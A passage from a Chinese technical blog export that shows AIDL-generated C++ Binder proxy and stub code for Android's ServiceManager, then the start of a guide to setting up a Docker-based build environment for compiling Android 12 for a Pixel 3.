(::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeBool(allowIsolated); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeInt32(dumpPriority); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_addService, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->addService(name, service, allowIsolated, dumpPriority); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::listServices(int32_t dumpPriority, ::std::vector&lt;::std::string>* _aidl_return) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeInt32(dumpPriority); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_listServices, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->listServices(dumpPriority, _aidl_return); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_ret_status = _aidl_reply.readUtf8VectorFromUtf16Vector(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::registerForNotifications(const ::std::string&amp; name, const ::android::sp&lt;::android::os::IServiceCallback>&amp; callback) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeStrongBinder(::android::os::IServiceCallback::asBinder(callback)); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_registerForNotifications, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->registerForNotifications(name, callback); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::unregisterForNotifications(const ::std::string&amp; name, const ::android::sp&lt;::android::os::IServiceCallback>&amp; callback) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeStrongBinder(::android::os::IServiceCallback::asBinder(callback)); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_unregisterForNotifications, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->unregisterForNotifications(name, callback); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::isDeclared(const ::std::string&amp; name, bool* _aidl_return) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_isDeclared, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->isDeclared(name, _aidl_return); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_ret_status = _aidl_reply.readBool(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::getDeclaredInstances(const ::std::string&amp; iface, ::std::vector&lt;::std::string>* _aidl_return) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(iface); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_getDeclaredInstances, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->getDeclaredInstances(iface, _aidl_return); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_ret_status = _aidl_reply.readUtf8VectorFromUtf16Vector(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::updatableViaApex(const ::std::string&amp; name, ::std::optional&lt;::std::string>* _aidl_return) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_updatableViaApex, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->updatableViaApex(name, _aidl_return); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_ret_status = _aidl_reply.readUtf8FromUtf16(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::registerClientCallback(const ::std::string&amp; name, const ::android::sp&lt;::android::IBinder>&amp; service, const ::android::sp&lt;::android::os::IClientCallback>&amp; callback) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeStrongBinder(service); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeStrongBinder(::android::os::IClientCallback::asBinder(callback)); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_registerClientCallback, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->registerClientCallback(name, service, callback); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::tryUnregisterService(const ::std::string&amp; name, const ::android::sp&lt;::android::IBinder>&amp; service) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeStrongBinder(service); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_tryUnregisterService, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->tryUnregisterService(name, service); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::getServiceDebugInfo(::std::vector&lt;::android::os::ServiceDebugInfo>* _aidl_return) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_getServiceDebugInfo, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->getServiceDebugInfo(_aidl_return); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_ret_status = _aidl_reply.readParcelableVector(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;&#125; // namespace os&#125; // namespace android#include &lt;android/os/BnServiceManager.h>#include &lt;binder/Parcel.h>#include &lt;binder/Stability.h>namespace android &#123;namespace os &#123;BnServiceManager::BnServiceManager()&#123; ::android::internal::Stability::markCompilationUnit(this);&#125;::android::status_t BnServiceManager::onTransact(uint32_t _aidl_code, const ::android::Parcel&amp; _aidl_data, ::android::Parcel* _aidl_reply, uint32_t _aidl_flags) &#123; ::android::status_t _aidl_ret_status = ::android::OK; switch (_aidl_code) &#123; case BnServiceManager::TRANSACTION_getService: &#123; ::std::string in_name; ::android::sp&lt;::android::IBinder> _aidl_return; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(getService(in_name, &amp;_aidl_return)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; _aidl_ret_status = _aidl_reply->writeStrongBinder(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_checkService: &#123; ::std::string in_name; ::android::sp&lt;::android::IBinder> _aidl_return; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(checkService(in_name, &amp;_aidl_return)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; _aidl_ret_status = _aidl_reply->writeStrongBinder(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_addService: &#123; ::std::string in_name; ::android::sp&lt;::android::IBinder> in_service; bool in_allowIsolated; int32_t in_dumpPriority; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; _aidl_ret_status = _aidl_data.readStrongBinder(&amp;in_service); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; _aidl_ret_status = _aidl_data.readBool(&amp;in_allowIsolated); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; _aidl_ret_status = _aidl_data.readInt32(&amp;in_dumpPriority); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(addService(in_name, in_service, in_allowIsolated, in_dumpPriority)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_listServices: &#123; int32_t in_dumpPriority; ::std::vector&lt;::std::string> _aidl_return; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readInt32(&amp;in_dumpPriority); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(listServices(in_dumpPriority, &amp;_aidl_return)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; _aidl_ret_status = _aidl_reply->writeUtf8VectorAsUtf16Vector(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_registerForNotifications: &#123; ::std::string in_name; ::android::sp&lt;::android::os::IServiceCallback> in_callback; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; _aidl_ret_status = _aidl_data.readStrongBinder(&amp;in_callback); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(registerForNotifications(in_name, in_callback)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_unregisterForNotifications: &#123; ::std::string in_name; ::android::sp&lt;::android::os::IServiceCallback> in_callback; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; _aidl_ret_status = _aidl_data.readStrongBinder(&amp;in_callback); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(unregisterForNotifications(in_name, in_callback)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_isDeclared: &#123; ::std::string in_name; bool _aidl_return; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(isDeclared(in_name, &amp;_aidl_return)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; _aidl_ret_status = _aidl_reply->writeBool(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_getDeclaredInstances: &#123; ::std::string in_iface; ::std::vector&lt;::std::string> _aidl_return; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_iface); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(getDeclaredInstances(in_iface, &amp;_aidl_return)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; _aidl_ret_status = _aidl_reply->writeUtf8VectorAsUtf16Vector(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_updatableViaApex: &#123; ::std::string in_name; ::std::optional&lt;::std::string> _aidl_return; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(updatableViaApex(in_name, &amp;_aidl_return)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; _aidl_ret_status = _aidl_reply->writeUtf8AsUtf16(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_registerClientCallback: &#123; ::std::string in_name; ::android::sp&lt;::android::IBinder> in_service; ::android::sp&lt;::android::os::IClientCallback> in_callback; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; _aidl_ret_status = _aidl_data.readStrongBinder(&amp;in_service); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; _aidl_ret_status = _aidl_data.readStrongBinder(&amp;in_callback); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(registerClientCallback(in_name, in_service, in_callback)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_tryUnregisterService: &#123; ::std::string in_name; ::android::sp&lt;::android::IBinder> in_service; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; _aidl_ret_status = _aidl_data.readStrongBinder(&amp;in_service); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(tryUnregisterService(in_name, in_service)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_getServiceDebugInfo: &#123; ::std::vector&lt;::android::os::ServiceDebugInfo> _aidl_return; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; ::android::binder::Status _aidl_status(getServiceDebugInfo(&amp;_aidl_return)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; _aidl_ret_status = _aidl_reply->writeParcelableVector(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; &#125; break; default: &#123; _aidl_ret_status = ::android::BBinder::onTransact(_aidl_code, _aidl_data, _aidl_reply, _aidl_flags); &#125; break; &#125; if (_aidl_ret_status == ::android::UNEXPECTED_NULL) &#123; _aidl_ret_status = ::android::binder::Status::fromExceptionCode(::android::binder::Status::EX_NULL_POINTER).writeToParcel(_aidl_reply); &#125; return _aidl_ret_status;&#125;&#125; // namespace os&#125; // namespace android# 参考资料 gityuan 大佬的 Binder 系列 第 6 章 深入理解 Binder Android 12 系统源码分析 | Native Binder 代码变迁 Android 深入浅出之 Binder 机制 理解 Android Binder 机制 (2/3)：C++ 层","categories":[],"tags":[]},{"title":"pixel3安卓系统编译及刷入过程记录","slug":"android-platform-compile","date":"2024-06-20T09:33:17.000Z","updated":"2025-04-08T18:55:11.446Z","comments":true,"path":"android-platform-compile/","link":"","permalink":"https://oacia.dev/android-platform-compile/","excerpt":"","text":"想要下载并编译安卓系统，请必须预留至少 250G 及以上的空余空间，并保持代理连接稳定，否则将导致下载失败并从头下载！ # 安卓系统编译环境配置 # 为虚拟机配置代理 # 查看虚拟机代理地址 打开 clash for windows , 并打开 Allow LAN 的开关，随后点击 network interfaces 请注意我的虚拟机使用的网络连接方式为 NAT 模式，所以需要关注 VMnet8 的地址，所以对于该虚拟机，代理地址为 192.168.27.1 , 端口就是 clash 中 Port 选项所显示的端口 # 启用虚拟机代理 依次点击如下选项进入代理配置 输入代理地址保存即可 # 配置 docker ubuntu 镜像 # 安装 docker sudo apt install docker.io# docker pull 代理配置 sudo mkdir -p /etc/systemd/system/docker.service.dsudo gedit /etc/systemd/system/docker.service.d/proxy.conf输入以下代理服务器内容 [Service]Environment=\"HTTP_PROXY=http://192.168.27.1:7890/\"Environment=\"HTTPS_PROXY=http://192.168.27.1:7890/\"Environment=\"NO_PROXY=localhost,127.0.0.1\"# 刷新配置并重启 docker 服务 sudo systemctl daemon-reloadsudo systemctl restart docker# docker 镜像代理配置 sudo mkdir -p ~/.docker/sudo gedit ~/.docker/config.json输入以下内容 &#123; \"proxies\": &#123; \"default\": &#123; \"httpProxy\": \"http://192.168.27.1:7890/\", \"httpsProxy\": \"http://192.168.27.1:7890/\", \"noProxy\": \"localhost,127.0.0.1\" &#125; &#125;&#125;# 下载 Ubuntu 镜像 docker pull ubuntu# 运行 Ubuntu 镜像 docker run --privileged -it --net host --name aplatform ubuntu /bin/bash# 安装 sudo,vim apt-get updateapt-get install vimapt-get install sudo# 修改 apt-get 的软件源为阿里源 sudo cp /etc/apt/sources.list /etc/apt/sources.list_backupsudo vim /etc/apt/sources.list替换为如下内容 deb http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-updates main restricted universe multiverse# deb http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiverse# deb-src http://mirrors.aliyun.com/ubuntu/ jammy-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ jammy-backports main restricted universe multiverse随后将 apt-get 更新至最新版本 sudo apt-get updatesudo apt-get upgradesudo apt-get install build-essential# 安装必要的库 sudo apt-get install git-core gnupg flex bison build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 libncurses5 x11proto-core-dev libx11-dev lib32z1-dev libgl1-mesa-dev libxml2-utils xsltproc unzip fontconfig libssl-dev bc kmod cpio git curl rsync# 为 git 配置基本信息 git config --global user.email \"xxx@gmail.com\"git config --global user.name \"xxx\"git config --global http.proxy 192.168.27.1:7890# 安装 repo mkdir ~/bincurl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repochmod a+x ~/bin/repo# 修改 repo 的下载源为清华源，并添加 repo 至全局变量 # 打开全局变量配置文件 sudo vim ~/.bashrc# 添加全局变量 在末尾添加这三行并保存 # repoexport REPO_URL='https://mirrors.tuna.tsinghua.edu.cn/git/git-repo/'export PATH=\"~/bin:$PATH\"# 使配置文件生效 source ~/.bashrc# 安装 python 如果使用 python --version 有打印 python 版本的话，那么这一步就不需要了，如果 docker 中没有安装 python , 在 docker 内使用如下命令安装 sudo apt-get install software-properties-commonadd-apt-repository ppa:deadsnakes/ppasudo apt install python3.9sudo ln -s /usr/bin/python3 /usr/bin/python# 修改交换区大小 为了防止编译源码的过程中由于交换区不足而失败，所以我们需要去修改虚拟机的交换区的大小 # 如果提示 No such file or directory，那就直接进行下面设置交换区的操作sudo swapoff /swapfilesudo rm /swapfile# 设置了 32g 交换区，防止编译失败，执行下列命令需要花费一段时间，如果执行命令后没有输出，请耐心等待命令执行完毕sudo dd if=/dev/zero of=/swapfile bs=1GB count=32sudo chmod 600 /swapfilesudo mkswap -f /swapfilesudo swapon /swapfile# 安卓系统源码下载 # 查看 android 版本 进入代号，标记和 build 号来查看安卓系统的版本 如果是预装的系统，那么 kernel 版本和系统版本是有对应关系的，例如我给 pixel3 刷入的系统为 blueline-sp1a.210812.016.c2-factory-fa981d87 , 那么在上面提到的网址内找到该安卓系统该 build ID 所对应的安卓系统版本 android-12.0.0_r34 如图所示 # 下载 输入如下命令来进行安卓系统源码下载，分支就选择我们之前查找到的那个分支 mkdir 